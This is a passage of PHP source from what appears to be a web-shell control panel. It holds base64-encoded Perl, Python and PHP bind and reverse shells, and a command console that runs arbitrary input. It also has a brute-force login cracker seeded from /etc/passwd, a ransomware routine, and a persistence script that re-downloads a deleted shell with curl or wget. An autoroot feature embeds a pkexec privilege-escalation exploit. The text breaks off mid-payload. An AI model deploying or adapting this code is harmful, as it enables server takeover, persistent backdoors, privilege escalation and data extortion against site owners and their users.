		$rank['local_rank'],
		$rankDAPA["DA"],
		$rankDAPA["PA"],
	];

	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
}

function network() {
	pages("network", ["Tools","Network"]); 

	$server 	= $_POST["server"];
	$port 		= $_POST["port"];
	$content 	= "";
	$nameFile 	= "";
	$exe 		= "";
	$output		= "";

	if($_POST["bpl"])
	{
		$content = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		$nameFile = "bp.pl";
		$exe = "perl bp.pl $port 1>/dev/null 2>&1 &";
	}

	if($_POST['backconnect'] == 'perl')
	{
		$content = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
		$nameFile = "bc.pl";
		$exe = "perl bc.pl $server $port 1>/dev/null 2>&1 &";
	}

	if($_POST['backconnect'] == 'python')
	{
		$content = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
		$nameFile = "bc.py";
		$exe = "python bc.py $server $port 1>/dev/null 2>&1 &";
	}

	if($_POST["backconnect"] == "php")
	{
		$content = base64_decode("PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKc2V0X3RpbWVfbGltaXQoMCk7CgokaXAgPSAkYXJndlsxXTsKJHBvcnQgPSAkYXJndlsyXTsKCiRoZWFkZXIgPSAiCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG4KLi46OiBCYWNrQ29ubmVjdCBQSFAgQnkgSW5kb1NlYyAuLjo6XG4KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cbgoiOwoKZnVuY3Rpb24gZXhlKCRjbWQpCnsKCSRidWZmID0gJyc7CgoJaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkKICAgIHsKCQlAb2Jfc3RhcnQoKTsKCQlAc3lzdGVtKCRjbWQpOwogICAgICAgICRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwogICAgICAgIEBvYl9lbmRfY2xlYW4oKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpCiAgICB7CgkJQGV4ZWMoJGNtZCwkcmVzdWx0cyk7CgkJJGJ1ZmYgPSBAam9pbigiXG4iLCRyZXN1bHRzKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKQogICAgewoJCUBvYl9zdGFydCgpOwoJCUBwYXNzdGhydSgkY21kKTsKICAgICAgICAkYnVmZiA9IEBvYl9nZXRfY29udGVudHMoKTsKCQlAb2JfZW5kX2NsZWFuKCk7Cgl9IAogICAgZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKQogICAgewoJCSRidWZmID0gQHNoZWxsX2V4ZWMoJGNtZCk7Cgl9CglyZXR1cm4gJGJ1ZmY7Cn0KCmZ1bmN0aW9uIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRwYWNrYWdlKQp7CiAgICBAZnB1dHMoJHNvY2tldCwgJHBhY2thZ2UpOwp9Cgokc29ja2V0ID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0cik7CgppZigkZXJybm8gIT09IDApIGRpZSgiJGVycm5vOiAkZXJyc3RyIik7IAppZighJHNvY2tldCkgZGllKCJVbmV4cGVjdGVkIGVycm9yIGhhcyBvY2N1cmVkLCBjb25uZWN0aW9uIG1heSBoYXZlIGZhaWxlZC4iKTsKCnNlbmRQYWNrYWdlKCRzb2NrZXQsICRoZWFkZXIpOwoKJGxlbiAgICAgICAgPSAxMDI0OwokaXBTZXJ2ZXIgICA9IGdldEhvc3RCeU5hbWUoZ2V0SG9zdE5hbWUoKSk7CiRpc1Jvb3QgICAgID0gKHBvc2l4X2dldHVpZCgpID09IDApID8gIiMiIDogIiQiOwokY21kICAgICAgICA9ICLilIxbJGlwU2VydmVyQEluZG9TZWNdflsiLmdldGN3ZCgpLiJdXG7ilJQkaXNSb290ICI7CgpzZW5kUGFja2FnZSgkc29ja2V0LCAkY21kKTsKCndoaWxlKCFmZW9mKCRzb2NrZXQpKXsKICAgICRjbWQgICAgICAgID0gIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKICAgICRjb21tYW5kICAgID0gZmdldHMoJHNvY2tldCwgJGxlbik7CiAgICAkY29tbWFuZHMgICA9IHRyaW0oc3RydG9sb3dlcigkY29tbWFuZCkpOwoKICAgIGlmKAogICAgICAgICRjb21tYW5kcyA9PSAiZXhpdCIgfHwgCiAgICAgICAgJGNvbW1hbmRzID09ICJxdWl0IiB8fAogICAgICAgICRjb21tYW5kcyA9PSAicSIKICAgICkgYnJlYWs7CiAgICAKICAgIGlmKHByZWdfbWF0Y2goIi9jZFwgKFteXHNdKykvaSIsJGNvbW1hbmQsJHJyKSkgewoJICAgICRkZCA9ICRyclsxXTsKCSAgICBpZihpc19kaXIoJGRkKSkgY2hkaXIoJGRkKTsKCSAgICAkbyA9ICJcbiIuIuKUjFskaXBTZXJ2ZXJASW5kb1NlY11+WyIuZ2V0Y3dkKCkuIl1cbuKUlCRpc1Jvb3QgIjsKCX0gZWxzZSAkbyA9ICJcbiIuZXhlKCRjb21tYW5kKS4iXG5cbiRjbWQiOwoKICAgIHNlbmRQYWNrYWdlKCRzb2NrZXQsICRvKTsKfQpAZmNsb3NlKCRzb2NrZXQpOw==");
		$nameFile = "bc.php";
		$exe = "php bc.php $server $port 1>/dev/null 2>&1 &";
	}

	if(isset($_POST["backconnect"]) || isset($_POST["bpl"])) {
		$file = fopen($nameFile, "w");
		fwrite($file,$content);
		$out = exe($exe);
		sleep(1);
		$output = "<pre class='text-light'>$out\n".exe("ps aux | grep $nameFile")."</pre>";
		unlink($nameFile);
	}


}

function console()
{
	if(isset($_POST["console"]) || isset($_POST["cheat"])) {
		$command = (!$_POST["console"] == "") ? $_POST["console"] : $_POST["cheat"]." 2>&1";
		$out = exe($command);

		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array($out));
	} else {
		pages("console", ["Tools", "Console"], array("{{OUTPUT}}"), array(""));
	}
}

function bruteforce()
{
	if(!isset($_POST["crack"])) {
		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array("", $ulist));
	} else {
		$ulist = (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN'?exe("cut -d: -f1 /etc/passwd"):"");
		$url = $_POST['url'];
		$port = $_POST['port'];
		$protocol = $_POST['protocol'];
		$login = $_POST['login'];
		$ulistname = $_POST['ulist'];
		$plistname = $_POST['plist'];
		$save = $_POST['save'];

		$data = array();
		$output = array();

		foreach (explode("\n",$ulistname) as $username) {
			foreach (explode("\n",$plistname) as $password) {
				$data["login"] = trim($login);
				$data["url"] = trim($url);
				$data["port"] = trim($port);
				$data["protocol"] = trim($protocol);
				$data["username"] = trim($username);
				$data["password"] = trim($password);

				if($login == "mysqli_connect" || $login == "ftp_connect") $output[] = crackFunctionLogin($data);
				else $output[] =  curlRequestCrack($data);
			}
		}

		$fp = fopen($save, "w");
		fwrite($fp, implode(" \n", $output));
		fclose($fp);

		pages("bruteforce", ["Tools", "Brute Force"], array("{{OUTPUT}}", "{{ULIST}}"), array(implode(" ", $output), $ulist));
	}
	

}

function search(){
	
	global $path;

	if(!isset($_POST["method"])) {
		pages("search", ["Tools", "Search"], array("{{OUTPUT}}", "{{DIR}}"), array("", $path));
	} else {
		$method = $_POST["method"];
		$string = $_POST["string"];
		$dir = $_POST["dir"];
		$ext = $_POST["ext"];
		$exclude = $_POST["exclude"];

		$outputFile = searchString($method, $dir, $string, $ext, $exclude);
		pages("search", ["Tools", "Search"], array("{{OUTPUT}}", "{{DIR}}"), array(implode("\n", $outputFile), $path));
	}
}

function ransomware() {
	global $path;

	$search = array("{{DIR}}", "{{OUTPUT}}");
	$replace = array($path, "");

	if(isset($_POST["path"]) && isset($_POST["key"])) {
		
		$output = ransom($_POST["path"], $_POST["key"]);
		
		$replace[1] = implode(' ', $output);

		pages("ransomware", ["Tools", "Ransomware"], $search, $replace);
	} else {
		pages("ransomware", ["Tools", "Ransomware"], $search, $replace);
	}
}

function shellzombie()
{
	global $path;
	
	pages("shellzombie", ["Tools", "Shell Zombie"], array("{{PATH}}"), array($path));

	if(isset($_POST["infect"])) {
		$urlShell = $_POST["urlShell"];
		$dirShell = $_POST["dirShell"];
		$nameShell = $_POST["nameShell"];

		$nameZombie = substr(md5(mt_rand()), 0, 7).".py";
		$infectFile = base64_decode("IyBhdXRvIGNyZWF0ZSBzaGVsbCB3aGVuIHNoZWxsIGdldCBkZWxldGUKIyBjb2RlZCBieSBSaXpzeWFkIEFSIC0geyBJbmRvU2VjIH0KIyB0aGFua3MgdG8gcm9vdEB4LWtyeXB0MG4teAojIHJlZmVyZW5jZTogaHR0cHM6Ly9naXRodWIuY29tL1N5c3RlbU9mUGVrYWxvbmdhbi9hdXRvLWNyZWF0ZS1zaGVsbAoKZnJvbSBvcy5wYXRoIGltcG9ydCBleGlzdHMsIGpvaW4KZnJvbSBvcyBpbXBvcnQgc3lzdGVtCmZyb20gc3lzIGltcG9ydCBhcmd2CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQoKZGVmIGNtZF9leGlzdHMoY21kKToKICAgIHJldHVybiBzdWJwcm9jZXNzLmNhbGwoInR5cGUgIiArIGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkgPT0gMAoKZGVmIGRvd25sb2FkRmlsZSh1cmwsIGxva2FzaSwgbmFtZV9maWxlKToKICAgIGlmIGNtZF9leGlzdHMoImN1cmwiKToKICAgICAgICBzeXN0ZW0oJ2N1cmwge30gPiB7fScuZm9ybWF0KHVybCwgam9pbihsb2thc2ksIG5hbWVfZmlsZSkpKQogICAgZWxpZiBjbWRfZXhpc3RzKCJ3Z2V0Iik6CiAgICAgICAgc3lzdGVtKCJ3Z2V0IC1QIHt9IC1PIHt9IHt9Ii5mb3JtYXQobG9rYXNpLCBuYW1lX2ZpbGUsIHVybCkpCiAgICBlbHNlOgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQodXJsKQoKICAgICAgICBhID0gb3Blbihqb2luKGxva2FzaSwgbmFtZV9maWxlKSwgJ2EnKSAjIGlmIGNvbW1hbmQgbm90IGZvdW5kIHVzaW5nIGxpYnJhcnkgcmVxdWVzdHMKICAgICAgICBhLndyaXRlKHIudGV4dCkKICAgICAgICBhLmNsb3NlKCkKCiAgICAKZGVmIG1haW4odXJsLCBkaXJfYmFja2Rvb3IsIG5hbWVfYmFja2Rvb3IpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBmaWxlID0gZXhpc3RzKGpvaW4oZGlyX2JhY2tkb29yLG5hbWVfYmFja2Rvb3IpKSAjIGlmIHRoZSBmaWxlIGlzIHN0aWxsIGVtYmVkZGVkCgogICAgICAgIGlmIGZpbGU6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICAgICAgcGFzcwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRvd25sb2FkRmlsZSh1cmwsIGRpcl9iYWNrZG9vciwgbmFtZV9iYWNrZG9vcikKICAgICAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgIAogICAgICAgIAp1cmwgPSBhcmd2WzFdCmxva2FzaSA9IGFyZ3ZbMl0KbmFtZV9maWxlID0gYXJndlszXQoKbWFpbih1cmwsIGxva2FzaSwgbmFtZV9maWxlKQ==");

		$handle = @fopen("$dirShell/$nameZombie", "w");
		fwrite($handle, $infectFile);
		exe("python $dirShell/$nameZombie $urlShell $dirShell $nameShell >/dev/null 2>&1 &");
		sleep(1);
		unlink("$dirShell/$nameZombie");
		swall("Success", "Success Infection Website", "success", current_path("shellzombie", $path));
	}
}

function autoroot() {
	$cekLib = array();
	$arraylib = ["gcc", "python", "pkexec"];
	$templateForm = "";

	foreach($arraylib as $lib) {
		$check = strtolower(exe("$lib --help"));
		if(strpos($check,"usage") !== false) continue;
		$cekLib[] = $lib;
	}

	if(count($cekLib) > 0) {
		$templateForm = "<div class='alert alert-danger' role='alert'>can't use this feature, there is a library not enabled: ".implode(", ",$cekLib)."</div>";
	} else if(file_exists("rootids.php")) {
		$templateForm = "<a class='btn btn-info btn-block' href='rootids.php' target='_blank'>go to link</a>";
	} else {
		$templateForm = '<form method="post"><input type="hidden" name="cat" value="rooted"><button type="submit" class="btn btn-primary btn-block">Rooted</button></form>';
	}

	if(isset($_POST["cat"])) {
		$content = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpAaW5pX3NldCgib3V0cHV0X2J1ZmZlcmluZyIsIDApOwpAaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCAwKTsKCmlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRlZ2lkIikpIHsKICAgICR1c2VyID0gQGdldF9jdXJyZW50X3VzZXIoKTsKICAgICR1aWQgPSBAZ2V0bXl1aWQoKTsKICAgICRnaWQgPSBAZ2V0bXlnaWQoKTsKICAgICRncm91cCA9ICI/IjsKfSBlbHNlIHsKICAgICR1aWQgPSBAcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsKICAgICRnaWQgPSBAcG9zaXhfZ2V0Z3JnaWQocG9zaXhfZ2V0ZWdpZCgpKTsKICAgICR1c2VyID0gJHVpZFsibmFtZSJdOwogICAgJHVpZCA9ICR1aWRbInVpZCJdOwogICAgJGdyb3VwID0gJGdpZFsibmFtZSJdOwogICAgJGdpZCA9ICRnaWRbImdpZCJdOwp9CgpmdW5jdGlvbiBleGUoJGNtZCkKewoJJGJ1ZmYgPSAnJzsKCSRjbWQgLj0gIiAyPiYxIjsKCglpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKQogICAgewoJCUBvYl9zdGFydCgpOwoJCUBzeXN0ZW0oJGNtZCk7CiAgICAgICAgJGJ1ZmYgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7CiAgICAgICAgQG9iX2VuZF9jbGVhbigpOwoJfSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ2V4ZWMnKSkKICAgIHsKCQlAZXhlYygkY21kLCRyZXN1bHRzKTsKCQkkYnVmZiA9IEBqb2luKCJcbiIsJHJlc3VsdHMpOwoJfSAKICAgIGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpCiAgICB7CgkJQG9iX3N0YXJ0KCk7CgkJQHBhc3N0aHJ1KCRjbWQpOwogICAgICAgICRidWZmID0gQG9iX2dldF9jb250ZW50cygpOwoJCUBvYl9lbmRfY2xlYW4oKTsKCX0gCiAgICBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpCiAgICB7CgkJJGJ1ZmYgPSBAc2hlbGxfZXhlYygkY21kKTsKCX0KCWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Byb2Nfb3BlbicpKQoJewoJCSRkZXNjID0gYXJyYXkoCgkJCTAgPT4gYXJyYXkoInBpcGUiLCAiciIpLAoJCQkxID0+IGFycmF5KCJwaXBlIiwgInciKSwKCQkJMiA9PiBhcnJheSgicGlwZSIsICJ3IikKCQkpOwoKCQkkcHJvYyA9IEBwcm9jX29wZW4oJGNtZCwgJGRlc2MsICRwaXBlcywgZ2V0Y3dkKCksIGFycmF5KCkpOwoJCWlmKGlzX3Jlc291cmNlKCRwcm9jKSkgewoJCQl3aGlsZSgkcmVzID0gZmdldHMoJHBpcGVzWzFdKSkgeyBpZighZW1wdHkoJHJlcykpICRidWZmIC49ICRyZXM7IH0KCQkJd2hpbGUoJHJlcyA9IGZnZXRzKCRwaXBlc1syXSkpIHsgaWYoIWVtcHR5KCRyZXMpKSAkYnVmZiAuPSAkcmVzOyB9CgkJfQoJCUBwcm9jX2Nsb3NlKCRwcm9jKTsKCX0KCWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3BvcGVuJykpCgl7CgkJJHJlcyA9IEBwb3BlbigkY21kLCAncicpOwoJCWlmKCRyZXMpIHsKCQkJd2hpbGUoIWZlb2YoJHJlcykpIHsgJGJ1ZmYgLj0gZnJlYWQoJHJlcywgMjA5Nik7IH0KCQkJcGNsb3NlKCRyZXMpOwoJCX0KCX0KCXJldHVybiAkYnVmZjsKfQoKZnVuY3Rpb24gcm9vdGMoKSB7CiAgICAkcHJpdmVzYyA9CiAgICAgICAgIkx5b0tJQ29nVUhKdmIyWWdiMllnUTI5dVkyVndkQ0JtYjNJZ1VIZHVTMmwwT2lCTWIyTmhiQ0JRY21sMmFXeGxaMlVnUlhOallXeGhkR2x2YmlCV2RXeHVaWEpoWW1sc2FYUjVJRVJwYzJOdmRtVnlaV1FnYVc0Z2NHOXNhMmwwNG9DWmN5QndhMlY0WldNZ0tFTldSUzB5TURJeExUUXdNelFwSUdKNUlFRnVaSEpwY3lCU1lYVm5kV3hwY3lBOGJXOXZRR0Z5ZEdobGNITjVMbVYxUGdvZ0tpQkJaSFpwYzI5eWVUb2dhSFIwY0hNNkx5OWliRzluTG5GMVlXeDVjeTVqYjIwdmRuVnNibVZ5WVdKcGJHbDBhV1Z6TFhSb2NtVmhkQzF5WlhObFlYSmphQzh5TURJeUx6QXhMekkxTDNCM2JtdHBkQzFzYjJOaGJDMXdjbWwyYVd4bFoyVXRaWE5qWVd4aGRHbHZiaTEyZFd4dVpYSmhZbWxzYVhSNUxXUnBjMk52ZG1WeVpXUXRhVzR0Y0c5c2EybDBjeTF3YTJWNFpXTXRZM1psTFRJd01qRXROREF6TkFvZ0tpOEtJMmx1WTJ4MVpHVWdQSE4wWkdsdkxtZytDaU5wYm1Oc2RXUmxJRHh6ZEdSc2FXSXVhRDRLSTJsdVkyeDFaR1VnUEhWdWFYTjBaQzVvUGdvS1kyaGhjaUFxYzJobGJHd2dQU0FLQ1NJamFXNWpiSFZrWlNBOGMzUmthVzh1YUQ1Y2JpSUtDU0lqYVc1amJIVmtaU0E4YzNSa2JHbGlMbWcrWEc0aUNna2lJMmx1WTJ4MVpHVWdQSFZ1YVhOMFpDNW9QbHh1WEc0aUNna2lkbTlwWkNCblkyOXVkaWdwSUh0OVhHNGlDZ2tpZG05cFpDQm5ZMjl1ZGw5cGJtbDBLQ2tnZTF4dUlnb0pJZ2x6WlhSMWFXUW9NQ2s3SUhObGRHZHBaQ2d3S1R0Y2JpSUtDU0lKYzJWMFpYVnBaQ2d3S1RzZ2MyVjBaV2RwWkNnd0tUdGNiaUlLQ1NJSmMzbHpkR1Z0S0Z3aVpYaHdiM0owSUZCQlZFZzlMM1Z6Y2k5c2IyTmhiQzl6WW1sdU9pOTFjM0l2Ykc5allXd3ZZbWx1T2k5MWMzSXZjMkpwYmpvdmRYTnlMMkpwYmpvdmMySnBiam92WW1sdU95QnliU0F0Y21ZZ0owZERUMDVXWDFCQlZFZzlMaWNnSjNCM2JtdHBkQ2M3SUdOb2IzZHVJSEp2YjNRNmNtOXZkQ0JuWlhSeWIyOTBPeUJqYUcxdlpDQTBOemMzSUdkbGRISnZiM1E3SUM5aWFXNHZjMmhjSWlrN1hHNGlDZ2tpQ1dWNGFYUW9NQ2s3WEc0aUNna2lmU0k3Q2dwamFHRnlJQ3BuWlhSeWIyOTBJRDBnQ2draUkybHVZMngxWkdVZ1BIVnVhWE4wWkM1b1BseHVJZ29KSWlOcGJtTnNkV1JsSUR4emRHUnBieTVvUGx4dUlnb0pJbWx1ZENCdFlXbHVJQ2gyYjJsa0tWeHVJZ29KSW50Y2JpSUtDU0lKYzJWMFoybGtLREFwTzF4dUlnb0pJZ2x6WlhSMWFXUW9NQ2s3WEc0aUNna2lDWE41YzNSbGJTaGNJaTlpYVc0dlltRnphRndpS1R0Y2JpSUtDU0lKY21WMGRYSnVJREE3WEc0aUNna2lmU0k3Q2dwcGJuUWdiV0ZwYmlocGJuUWdZWEpuWXl3Z1kyaGhjaUFxWVhKbmRsdGRLU0I3Q2dsR1NVeEZJQ3BtY0RzS0NVWkpURVVnS21keU93b0pjM2x6ZEdWdEtDSnRhMlJwY2lBdGNDQW5SME5QVGxaZlVFRlVTRDB1SnpzZ2RHOTFZMmdnSjBkRFQwNVdYMUJCVkVnOUxpOXdkMjVyYVhRbk95QmphRzF2WkNCaEszZ2dKMGREVDA1V1gxQkJWRWc5TGk5d2QyNXJhWFFuSWlrN0NnbHplWE4wWlcwb0ltMXJaR2x5SUMxd0lIQjNibXRwZERzZ1pXTm9ieUFuYlc5a2RXeGxJRlZVUmkwNEx5OGdVRmRPUzBsVUx5OGdjSGR1YTJsMElESW5JRDRnY0hkdWEybDBMMmRqYjI1MkxXMXZaSFZzWlhNaUtUc0tDV1p3SUQwZ1ptOXdaVzRvSW5CM2JtdHBkQzl3ZDI1cmFYUXVZeUlzSUNKM0lpazdDZ2xtY0hKcGJuUm1LR1p3TENBaUpYTWlMQ0J6YUdWc2JDazdDZ2xtWTJ4dmMyVW9abkFwT3dvS0NXZHlJRDBnWm05d1pXNG9JbWRsZEhKdmIzUXVZeUlzSUNKM0lpazdDZ2xtY0hKcGJuUm1LR2R5TENBaUpYTWlMQ0JuWlhSeWIyOTBLVHNLQ1daamJHOXpaU2huY2lrN0Nnb0pjM2x6ZEdWdEtDSm5ZMk1nWjJWMGNtOXZkQzVqSUMxdklHZGxkSEp2YjNRaUtUc0tDZ2x6ZVhOMFpXMG9JbWRqWXlCd2QyNXJhWFF2Y0hkdWEybDBMbU1nTFc4Z2NIZHVhMmwwTDNCM2JtdHBkQzV6YnlBdGMyaGhjbVZrSUMxbVVFbERJaWs3Q2dsamFHRnlJQ3BsYm5aYlhTQTlJSHNnSW5CM2JtdHBkQ0lzSUNKUVFWUklQVWREVDA1V1gxQkJWRWc5TGlJc0lDSkRTRUZTVTBWVVBWQlhUa3RKVkNJc0lDSlRTRVZNVEQxd2QyNXJhWFFpTENCT1ZVeE1JSDA3Q2dsbGVHVmpkbVVvSWk5MWMzSXZZbWx1TDNCclpYaGxZeUlzSUNoamFHRnlLbHRkS1h0T1ZVeE1mU3dnWlc1MktUc0tmUT09IjsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCJwcnZlc2MuYyIsIGJhc2U2NF9kZWNvZGUoJHByaXZlc2MpKTsKICAgIHJldHVybiB0cnVlOwp9CgpmdW5jdGlvbiByb290c2hlbGxfcHkoKQp7CiAgICAkcm9vdHNoZWxsID0KICAgICAgICAiSXlFdlltbHVMM0I1ZEdodmJnb2pJQzBxTFNCamIyUnBibWM2SUhWMFppMDRJQzBxTFFwbWNtOXRJQ0FnSUhOMVluQnliMk5sYzNNZ2FXMXdiM0owSUZCdmNHVnVMQ0JRU1ZCRkxDQlRWRVJQVlZRS2FXMXdiM0owSUNCemVYTUtJQXBsZUhCc2IybDBJRDBnSnk0dloyVjBjbTl2ZENjS1kyMWtjeUFnSUNBOUlITjVjeTVoY21kMld6RmRDaUFLY0NBOUlGQnZjR1Z1S0Z0bGVIQnNiMmwwTENBbkoxMHNJSE4wWkc5MWREMVFTVkJGTENCemRHUnBiajFRU1ZCRkxDQnpkR1JsY25JOVUxUkVUMVZVS1Fwd2NtbHVkQ2h6ZEhJb2NDNWpiMjF0ZFc1cFkyRjBaU2hqYldSektWc3dYU2twIjsKICAgICRmcCA9IGZvcGVuKCJyb290c2hlbGwucHkiLCAidyIpOwogICAgZndyaXRlKCRmcCwgYmFzZTY0X2RlY29kZSgkcm9vdHNoZWxsKSk7CiAgICBmY2xvc2UoJGZwKTsKICAgIHJldHVybiB0cnVlOwp9CgpmdW5jdGlvbiBjaGVja2V4ZSgkZXhlKSB7CiAgICAkY2hlY2sgPSBzdHJ0b2xvd2VyKGV4ZSgkZXhlKSk7CiAgICByZXR1cm4gKHN0cnBvcygkY2hlY2ssInVzYWdlIikgIT09IGZhbHNlKTsKfQoKZnVuY3Rpb24gcHJvY2VzcygpIHsKICAgICRwcm9jID0gIlBEOXdhSEFLYUdWaFpHVnlLQ2RCWTJObGMzTXRRMjl1ZEhKdmJDMUJiR3h2ZHkxUGNtbG5hVzQ2SUNvbktUc0thV1lvSkY5UVQxTlVLU0I3Q2lBZ0pITmxibVJmWTIxa0lEMGdjM2x6ZEdWdEtDZHdlWFJvYjI0Z2NtOXZkSE5vWld4c0xuQjVJQ0luSUM0Z0pGOVFUMU5VV3lKamJXUWlYU0F1SUNjaUlESStKakVuS1RzS0lDQmxZMmh2S0NSelpXNWtYMk50WkNrN0NuMEtQejQ9IjsKICAgICRmcCA9IGZvcGVuKCJyb290aWRzMi5waHAiLCAidyIpOwogICAgZndyaXRlKCRmcCwgYmFzZTY0X2RlY29kZSgkcHJvYykpOwogICAgZmNsb3NlKCRmcCk7CiAgICByZXR1cm4gVHJ1ZTsKfQoKZnVuY3Rpb24gc2VuZGNtZCgpIHsKICAgICRmaWxlcyA9ICJQRDl3YUhBS2FXWW9JV1oxYm1OMGFXOXVYMlY0YVhOMGN5Z25jRzl6YVhoZloyVjBaV2RwWkNjcEtTQjdDZ2trZFhObGNpQTlJRUJuWlhSZlkzVnljbVZ1ZEY5MWMyVnlLQ2s3Q2dra2RXbGtJRDBnUUdkbGRHMTVkV2xrS0NrN0Nna2taMmxrSUQwZ1FHZGxkRzE1WjJsa0tDazdDZ2trWjNKdmRYQWdQU0FpUHlJN0NuMGdaV3h6WlNCN0N